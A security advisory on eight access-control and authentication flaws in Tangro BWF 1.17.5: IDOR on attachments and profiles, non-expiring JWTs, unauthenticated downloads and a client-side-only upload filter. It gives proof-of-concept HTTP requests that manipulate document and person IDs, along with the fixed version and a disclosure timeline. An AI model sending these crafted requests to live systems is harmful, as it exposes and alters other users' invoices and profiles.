---
title: Tangro BWF Multiple Vulnerabilties
date: 2022-05-16 21:00:00 +0200
categories: [Security Advisories]
author: "Dimitri Lesy & Tobias Györfi"
image: /posts/Tangro-BWF-Vulnerabilities/board.jpg
tags: [tangro, bwf, jwt, upload, idor, session, download]
description: Security Advisory
---

| Key | Value |
|---|---|
| Product | Tangro BWF |
| Vendor | tangro software components GmbH (Heidelberg, Germany) |
| Tested Version |  1.17.5 |
|Fixed Version | 1.18.1 |
| Mitigation | Update to version >= 1.18.1 |


## Adding Attachments to Arbitrary Workitem

| Key | Value |
|---|---|
| Vulnerability Type | Insecure Direct Object Reference |
| CVSSv3 Severity | AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N (Score 4.3) |
| CWE Reference | CWE-639 |
| CVE Reference | CVE-2020-26171 |

### Description

The "documentId" of attachment uploads to `/api/document/attachments/upload` can be manipulated. By doing this, users can add attachments to workitems that do not belong to them.

### Proof of Concept

When uploading an attachment to a document, the upload request specifies a document ID:

````
POST /api/document/attachments/upload HTTP/1.1
Host: <Tangro Host>
Content-Length: 410
X-AUTH-TOKEN: "<TOKEN>"
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarylayr7DbpEgYZ2lrs

------WebKitFormBoundarylayr7DbpEgYZ2lrs
Content-Disposition: form-data; name="documentId"

100000000000123456
------WebKitFormBoundarylayr7DbpEgYZ2lrs
Content-Disposition: form-data; name="file"; filename="file.txt"
Content-Type: text/plain

test

------WebKitFormBoundarylayr7DbpEgYZ2lrs
Content-Disposition: form-data; name="archiveObject"

/SSC/CSV
------WebKitFormBoundarylayr7DbpEgYZ2lrs--
````

By manipulating the documentID, the file will be added to the document that has been specified.

## JWT without Expiration

| Key | Value |
|---|---|
| Vulnerability Type | Session Fixation |
| CVSSv3 Severity | AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N (Score 4.2) |
| CWE Reference | CWE-294 |
| CVE Reference | CVE-2020-26172 |

### Description

Every login in Tangro generates the same JWT token, which allows an attacker to reuse the token when a session is active. The JWT token does not contain an expiration timestamp which enables an attacker to bypass the authentication using capture-replay.

### Proof of Concept

```
Headers = { "typ" : "JWT", "alg" : "HS256" }

Payload = {
"lastName" : "<LastName>",
"firstName" : "<FirstName>", 
"isSapUser" : false, 
"person" : "1234", 
"validPassword" : true, 
"fullName" : "<FullName>", 
"language" : "DE", 
"username" : "<Username>"
}

Signature = "<Signature>"
```

## Unauthenticated PDF Download

| Key | Value |
|---|---|
| Vulnerability Type | Incorrect Access Control |
| CVSSv3 Severity | AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N (Score 3.1) |
| CWE Reference | CWE-639 |
| CVE Reference | CVE-2020-26173 |

## Description

PDF files of invoices are served over the `/api/pdf/<documentID>` API endpoint and secured using an additional token:

`https://<Tangro Host>/api/pdf/00000000000000123456?token=<Token>`

While requiring the token prevents access to the PDF files without knowing its corresponding token, the API endpoint does not verify if the user requesting the document is logged in.

As a result, knowing the document’s ID and token it is possible to download the PDF without logging in.

## Upload Filetype Constraint Bypass

| Key | Value |
|---|---|
| Vulnerability Type | Upload Filetype Constraint Bypass |
| CVSSv3 Severity | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (Score 8.8) |
| CWE Reference | CWE-434 |
| CVE Reference | CVE-2020-26174 |

### Description

The Tangro application requests a list of allowed filetypes from the server and restricts uploads to the filetypes contained in this list. However, this restriction is enforced in the browser (client-side) and can easily be circumvented. This allows an attacker to upload any file as an attachment to a workitem. In a worst­case scenario, this vulnerability could lead to remote code execution.

### Proof of Concept

Request:

```
POST /api/document/attachments/upload HTTP/1.1 
Host: <Tangro Host> 
X-AUTH-TOKEN: "<Token>" 
Content-Type: multipart/form-data; 
boundary=----WebKitFormBoundarynhbkhkaxOGRUpaZa

------WebKitFormBoundarynhbkhkaxOGRUpaZa 
Content-Disposition: form-data; name="documentId"

100000000000123456 
------WebKitFormBoundarynhbkhkaxOGRUpaZa 
Content-Disposition: form-data; name="file"; filename="unsupportedfiletype.thinking" 
Content-Type: text/plain

The content of the file. 
------WebKitFormBoundarynhbkhkaxOGRUpaZa 
Content-Disposition: form-data; name="archiveObject"

/SSC/CSV 
------WebKitFormBoundarynhbkhkaxOGRUpaZa--
```

Server response:

```
HTTP/1.1 200 OK
Pragma: no-cache 
Expires: -1 
Content-Type: text/plain; charset=utf-8 Cache-Control: no-cache 
Connection: close 
Date: Thu, 17 Sep 2020 09:38:48 GMT

XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

## Profile Attributes of Other Users Writable

| Key | Value |
|---|---|
| Vulnerability Type | Insecure Direct Object Reference |
| CVSSv3 Severity | AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N (Score 6.5) |
| CWE Reference | CWE-639 |
| CVE Reference | CVE-2020-26175 |

### Overview

The value of "PERSON" in requests to `/api/profile` can be manipulated in order to change profile information of other users.

### Proof of Concept

```
POST /api/profile HTTP/1.1 
Host: <Tangro Host>

-- SNIP --
{ 
    "DESCRIPTION":"", 
    "ADDRESS_NAME1":"<Name>",
-- SNIP --
"PERSON":"1234", # By manipulating this ID, it is possible to change the profile information of other users.
"BIRTHDAY":"0000-00-00", "MANDT":"XXX"
```

## Unauthorised Listing of Attachments

| Key | Value |
|---|---|
| Vulnerability Type | Insecure Direct Object Reference |
| CVSSv3 Severity | AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N (Score 4.3) |
| CWE Reference | CWE-639 |
| CVE Reference | CVE-2020-26176 |

### Description

No or broken access control checks exist on the `/api/document/<DocumentID>/attachments` API endpoint.

Knowing a document ID, it is possible to list all the attachments of a workitem, including their respective IDs. This allows an attacker to gather valid attachment IDs for workitems that do not belong to them.

### Proof of Concept

Request:

```
GET /api/document/<DocumentID>/attachments HTTP/1.0 
Host: <Tangro Host>
X-AUTH-TOKEN: "<Token>"
```

Response:

```
HTTP/1.0 200 OK 
Content-Type: application/json; charset=utf-8 
Date: Thu, 17 Sep 2020 11:00:33 GMT

[{"archiveDocumentId":"<AttachmentID>","archiveId":"D1","archiveObject":"/SSC/PDF","creationDate":1594764000000,"name":"","sapBusinessObject":"<SAP ID>","user":""}]
```

## Editing Disabled Profile Attributes

| Key | Value |
|---|---|
| Vulnerability Type | Incorrect Access Control |
| CVSSv3 Severity | AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N (Score 4.3) |
| CWE Reference | CWE-639 |
| CVE Reference | CVE-2020-26177 |

### Description

## Overview

A user’s profile contains some items that are greyed out and thus are not intended to be edited by regular users. However, this restriction is only applied client­-side.
Manipulating any of the greyed out values in requests to `/api/profile` is not prohibited server-side.

## Unauthenticated Download of Workitem Attachments

| Key | Value |
|---|---|
| Vulnerability Type | Insecure Direct Object Reference |
| CVSSv3 Severity | AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N (Score 5.3) |
| CWE Reference | CWE-639 |
| CVE Reference | CVE-2020-26178 |

### Description

Knowing an attachment ID, it is possible to download workitem attachments without being authenticated.

### Proof of Concept

`https://<Tangro Host>/api/document/attachment/<AttachmentID>?archiveName=D1&fileType=/SSC/PDF`

## Disclosure Timeline

| Date | Event |
|---|---|
| 2020-09-17 | Vulnerability Discovered |
| 2020-10-01 | Vulnerability reported to vendor |
| 2020-10-01 | Vendor response |
| 2020-11-04 | Vulnerability fixed, software update 1.18.1 released |
| 2020-12-17 | Vulnerability disclosed |

## References

1. [Original Blogpost (Previous Employer, Thinking Objects GmbH)](https://blog.to.com/advisory-tangro-bwf-1-17-5-multiple-vulnerabilities/)
1. [Tangro Website](https://www.tangro.de/)